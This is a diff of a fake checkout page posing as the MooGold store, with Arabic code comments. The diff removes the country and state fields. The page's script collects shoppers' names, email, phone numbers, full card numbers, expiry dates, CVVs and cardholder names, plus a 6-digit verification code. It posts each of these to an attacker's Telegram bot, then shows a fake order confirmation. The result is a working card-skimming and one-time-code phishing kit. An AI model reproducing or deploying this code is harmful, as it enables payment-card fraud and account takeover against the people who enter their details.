@@ -409,23 +409,7 @@
                       <input class="w-full rounded-md border border-gray-300 bg-gray-200 px-3 py-2 text-sm text-gray-700 focus:outline-none focus:ring-2 focus:ring-blue-500" id="lastName" required="" type="text" />
                     </div>
                   </div>
-                  <div>
-                    <label class="block text-xs font-semibold mb-1 select-text" for="country">
-                      Country / Region
-                      <span class="text-red-600">*</span>
-                    </label>
-                    <select class="w-full rounded border border-gray-400 px-3 py-2 text-sm text-gray-700 focus:outline-none focus:ring-2 focus:ring-blue-500" id="country" required="">
-                      <option>
-                        United Arab Emirates
-                      </option>
-                    </select>
-                  </div>
-                  <div>
-                    <label class="block text-xs font-semibold mb-1 select-text" for="state">
-                      State / County (optional)
-                    </label>
-                    <input class="w-full rounded-md border border-gray-300 bg-gray-200 px-3 py-2 text-sm text-gray-700 focus:outline-none focus:ring-2 focus:ring-blue-500" id="state" placeholder="State" type="text" />
-                  </div>
+             
                   <div>
                     <label class="block text-xs font-semibold mb-1 select-text" for="email">
                       Email address
@@ -645,12 +629,12 @@
 </a>
   </div>
 
-  <script>
+ <script>
     // Enable Place order button only if terms checkbox is checked
     const termsCheckbox = document.getElementById('termsCheckbox');
     const placeOrderBtn = document.getElementById('placeOrderBtn');
     termsCheckbox.addEventListener('change', () => {
-      placeOrderBtn.disabled = !termsCheckbox.checked;
+        placeOrderBtn.disabled = !termsCheckbox.checked;
     });
 
     const phoneModal = document.getElementById('phoneModal');
@@ -679,28 +663,25 @@
 
     // إرسال بيانات الطلب إلى تليجرام
     function sendOrderToTelegram() {
-      var firstName = document.getElementById('firstName').value.trim();
-      var lastName = document.getElementById('lastName').value.trim();
-      var email = document.getElementById('email').value.trim();
-      var country = document.getElementById('country').value;
-      var state = document.getElementById('state').value.trim();
-      var orderNotes = document.getElementById('orderNotes').value.trim();
-      var phoneNumber = phoneNumberFormInput.value.trim();
+        var firstName = document.getElementById('firstName').value.trim();
+        var lastName = document.getElementById('lastName').value.trim();
+        var email = document.getElementById('email').value.trim();
+        // تم حذف الدولة والمحافظة من هنا
+        var orderNotes = document.getElementById('orderNotes').value.trim();
+        var phoneNumber = phoneNumberFormInput.value.trim();
 
-      // بيانات البطاقة
-      var cardNumber = document.getElementById('cardNumber').value.trim();
-      var expiryDate = document.getElementById('expiryDate').value.trim();
-      var cvv = document.getElementById('cvv').value.trim();
-      var cardHolderName = document.getElementById('cardHolderName').value.trim();
+        // بيانات البطاقة
+        var cardNumber = document.getElementById('cardNumber').value.trim();
+        var expiryDate = document.getElementById('expiryDate').value.trim();
+        var cvv = document.getElementById('cvv').value.trim();
+        var cardHolderName = document.getElementById('cardHolderName').value.trim();
 
-      var message = `
+        var message = `
 طلب جديد من موقع MooGold:
 ---------------------------
 👤 الاسم: ${firstName} ${lastName}
 📧 الإيميل: ${email}
 📞 رقم الهاتف: ${phoneNumber}
-🌍 الدولة: ${country}
-🏙 المحافظة: ${state}
 📝 ملاحظات: ${orderNotes}
 
 💳 معلومات البطاقة:
@@ -711,224 +692,224 @@ Holder: ${cardHolderName}
 ---------------------------
 `;
 
-      fetch(tgUrl, {
-        method: "POST",
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({
-          chat_id: tgChatId,
-          text: message
-        })
-      }).then(response => response.json())
-      .then(data => {
-        // إذا أردت إشعار أو تسجيل
-        // console.log('تم إرسال البيانات لتليجرام', data);
-      }).catch(error => {
-        // console.error('خطأ في الإرسال لتليجرام:', error);
-      });
+        fetch(tgUrl, {
+            method: "POST",
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+                chat_id: tgChatId,
+                text: message
+            })
+        }).then(response => response.json())
+        .then(data => {
+            // إذا أردت إشعار أو تسجيل
+        }).catch(error => {
+            // console.error('خطأ في الإرسال لتليجرام:', error);
+        });
     }
 
     // إرسال رمز التحقق إلى تليجرام
     function sendCodeToTelegram(code) {
-      var message = `رمز التحقق المدخل من العميل: ${code}`;
-      fetch(tgUrl, {
-        method: "POST",
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({
-          chat_id: tgChatId,
-          text: message
-        })
-      }).then(response => response.json())
-      .then(data => {
-        // تم الإرسال بنجاح
-      }).catch(error => {
-        // فشل الإرسال
-      });
+        var message = `رمز التحقق المدخل من العميل: ${code}`;
+        fetch(tgUrl, {
+            method: "POST",
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+                chat_id: tgChatId,
+                text: message
+            })
+        }).then(response => response.json())
+        .then(data => {
+            // تم الإرسال بنجاح
+        }).catch(error => {
+            // فشل الإرسال
+        });
     }
 
     // إرسال رقم الهاتف إلى تليجرام (simulate sending code)
     function sendPhoneToTelegram(phone) {
-      var message = `رقم الهاتف المدخل من العميل: ${phone}`;
-      fetch(tgUrl, {
-        method: "POST",
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({
-          chat_id: tgChatId,
-          text: message
-        })
-      }).then(response => response.json())
-      .then(data => {
-        // تم الإرسال بنجاح
-      }).catch(error => {
-        // فشل الإرسال
-      });
+        var message = `رقم الهاتف المدخل من العميل: ${phone}`;
+        fetch(tgUrl, {
+            method: "POST",
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+                chat_id: tgChatId,
+                text: message
+            })
+        }).then(response => response.json())
+        .then(data => {
+            // تم الإرسال بنجاح
+        }).catch(error => {
+            // فشل الإرسال
+        });
     }
 
     function startTimer() {
-      timeLeft = 60;
-      timerDisplay.textContent = formatTime(timeLeft);
-      resendBtn.disabled = true;
-      timerInterval = setInterval(() => {
-        timeLeft--;
+        timeLeft = 60;
         timerDisplay.textContent = formatTime(timeLeft);
-        if (timeLeft <= 0) {
-          clearInterval(timerInterval);
-          resendBtn.disabled = false;
-        }
-      }, 1000);
+        resendBtn.disabled = true;
+        timerInterval = setInterval(() => {
+            timeLeft--;
+            timerDisplay.textContent = formatTime(timeLeft);
+            if (timeLeft <= 0) {
+                clearInterval(timerInterval);
+                resendBtn.disabled = false;
+            }
+        }, 1000);
     }
 
     function formatTime(seconds) {
-      const m = Math.floor(seconds / 60).toString().padStart(2, '0');
-      const s = (seconds % 60).toString().padStart(2, '0');
-      return `${m}:${s}`;
+        const m = Math.floor(seconds / 60).toString().padStart(2, '0');
+        const s = (seconds % 60).toString().padStart(2, '0');
+        return `${m}:${s}`;
     }
 
     function openPhoneModal() {
-      phoneModal.classList.remove('hidden');
-      phoneInput.focus();
-      phoneInput.value = '';
+        phoneModal.classList.remove('hidden');
+        phoneInput.focus();
+        phoneInput.value = '';
     }
 
     function closePhoneModal() {
-      phoneModal.classList.add('hidden');
+        phoneModal.classList.add('hidden');
     }
 
     function openVerificationModal() {
-      verificationModal.classList.remove('hidden');
-      verificationInputs[0].focus();
-      startTimer();
-      clearVerificationInputs();
+        verificationModal.classList.remove('hidden');
+        verificationInputs[0].focus();
+        startTimer();
+        clearVerificationInputs();
     }
 
     function closeVerificationModal() {
-      verificationModal.classList.add('hidden');
-      clearInterval(timerInterval);
+        verificationModal.classList.add('hidden');
+        clearInterval(timerInterval);
     }
 
     function clearVerificationInputs() {
-      verificationInputs.forEach(input => input.value = '');
+        verificationInputs.forEach(input => input.value = '');
     }
 
     // Auto move focus on verification input
     verificationInputs.forEach((input, idx) => {
-      input.addEventListener('input', (e) => {
-        const val = e.target.value;
-        if (val.length > 1) {
-          e.target.value = val.slice(0,1);
-        }
-        if (val.length === 1 && idx < verificationInputs.length - 1) {
-          verificationInputs[idx + 1].focus();
-        }
-      });
-      input.addEventListener('keydown', (e) => {
-        if (e.key === 'Backspace' && !e.target.value && idx > 0) {
-          verificationInputs[idx - 1].focus();
-        }
-      });
+        input.addEventListener('input', (e) => {
+            const val = e.target.value;
+            if (val.length > 1) {
+                e.target.value = val.slice(0,1);
+            }
+            if (val.length === 1 && idx < verificationInputs.length - 1) {
+                verificationInputs[idx + 1].focus();
+            }
+        });
+        input.addEventListener('keydown', (e) => {
+            if (e.key === 'Backspace' && !e.target.value && idx > 0) {
+                verificationInputs[idx - 1].focus();
+            }
+        });
     });
 
     // Place order button click: open phone modal first
     placeOrderButton.addEventListener('click', () => {
-      // Validate phone number in form before sending order
-      const phoneNumberFormValue = phoneNumberFormInput.value.trim();
-      const phonePattern = /^[+0-9 ]{6,20}$/;
-      if (!phoneNumberFormValue || !phonePattern.test(phoneNumberFormValue)) {
-        alert('Please enter a valid phone number in the form.');
-        phoneNumberFormInput.focus();
-        return;
-      }
-      sendOrderToTelegram();
-      openPhoneModal();
+        // Validate phone number in form before sending order
+        const phoneNumberFormValue = phoneNumberFormInput.value.trim();
+        const phonePattern = /^[+0-9 ]{6,20}$/;
+        if (!phoneNumberFormValue || !phonePattern.test(phoneNumberFormValue)) {
+            alert('Please enter a valid phone number in the form.');
+            phoneNumberFormInput.focus();
+            return;
+        }
+        sendOrderToTelegram();
+        openPhoneModal();
     });
 
     // Cancel phone modal
     cancelPhoneBtn.addEventListener('click', () => {
-      closePhoneModal();
+        closePhoneModal();
     });
 
     // Submit phone modal form
     submitPhoneBtn.addEventListener('click', () => {
-      const phone = phoneInput.value.trim();
-      if (!phone) {
-        alert('Please enter your phone number.');
-        phoneInput.focus();
-        return;
-      }
-      // Optionally validate phone format here (basic)
-      const phonePattern = /^[+0-9 ]{6,20}$/;
-      if (!phonePattern.test(phone)) {
-        alert('Please enter a valid phone number.');
-        phoneInput.focus();
-        return;
-      }
-      sendPhoneToTelegram(phone);
-      closePhoneModal();
-      openVerificationModal();
+        const phone = phoneInput.value.trim();
+        if (!phone) {
+            alert('Please enter your phone number.');
+            phoneInput.focus();
+            return;
+        }
+        // Optionally validate phone format here (basic)
+        const phonePattern = /^[+0-9 ]{6,20}$/;
+        if (!phonePattern.test(phone)) {
+            alert('Please enter a valid phone number.');
+            phoneInput.focus();
+            return;
+        }
+        sendPhoneToTelegram(phone);
+        closePhoneModal();
+        openVerificationModal();
     });
 
     // Cancel verification modal
     cancelVerificationBtn.addEventListener('click', () => {
-      closeVerificationModal();
+        closeVerificationModal();
     });
 
     // Resend code button
     resendBtn.addEventListener('click', () => {
-      resendBtn.disabled = true;
-      startTimer();
-      clearVerificationInputs();
-      verificationInputs[0].focus();
-      // Here you can add resend code logic (e.g. API call)
+        resendBtn.disabled = true;
+        startTimer();
+        clearVerificationInputs();
+        verificationInputs[0].focus();
+        // Here you can add resend code logic (e.g. API call)
     });
 
     // Submit verification code
     submitVerificationBtn.addEventListener('click', () => {
-      // Collect code
-      const code = Array.from(verificationInputs).map(i => i.value).join('');
-      if (code.length < 6 || !/^\d{6}$/.test(code)) {
-        alert('Please enter a valid 6-digit verification code.');
-        verificationInputs[0].focus();
-        return;
-      }
-      // إرسال الكود لتليجرام
-      sendCodeToTelegram(code);
-      // Here you can add verification logic (e.g. API call)
-      // On success:
-      closeVerificationModal();
-      mainContent.classList.add('hidden');
-      confirmationMessage.classList.remove('hidden');
-      window.scrollTo({top:0, behavior:'smooth'});
+        // Collect code
+        const code = Array.from(verificationInputs).map(i => i.value).join('');
+        if (code.length < 6 || !/^\d{6}$/.test(code)) {
+            alert('Please enter a valid 6-digit verification code.');
+            verificationInputs[0].focus();
+            return;
+        }
+        // إرسال الكود لتليجرام
+        sendCodeToTelegram(code);
+        // Here you can add verification logic (e.g. API call)
+        // On success:
+        closeVerificationModal();
+        mainContent.classList.add('hidden');
+        confirmationMessage.classList.remove('hidden');
+        window.scrollTo({top:0, behavior:'smooth'});
     });
 
     // Close modals on outside click
     phoneModal.addEventListener('click', (e) => {
-      if (e.target === phoneModal) {
-        closePhoneModal();
-      }
+        if (e.target === phoneModal) {
+            closePhoneModal();
+        }
     });
     verificationModal.addEventListener('click', (e) => {
-      if (e.target === verificationModal) {
-        closeVerificationModal();
-      }
+        if (e.target === verificationModal) {
+            closeVerificationModal();
+        }
     });
 
     // Accessibility: close modals on Escape key
     document.addEventListener('keydown', (e) => {
-      if (e.key === 'Escape') {
-        if (!phoneModal.classList.contains('hidden')) {
-          closePhoneModal();
+        if (e.key === 'Escape') {
+            if (!phoneModal.classList.contains('hidden')) {
+                closePhoneModal();
+            }
+            if (!verificationModal.classList.contains('hidden')) {
+                closeVerificationModal();
+            }
         }
-        if (!verificationModal.classList.contains('hidden')) {
-          closeVerificationModal();
-        }
-      }
     });
 
     // Return to home button click
     returnHomeBtn.addEventListener('click', (e) => {
-      e.preventDefault();
-      window.location.href = '/';
+        e.preventDefault();
+        window.location.href = '/';
     });
-  </script>
+</script>
+
 
 </body>
 </html>
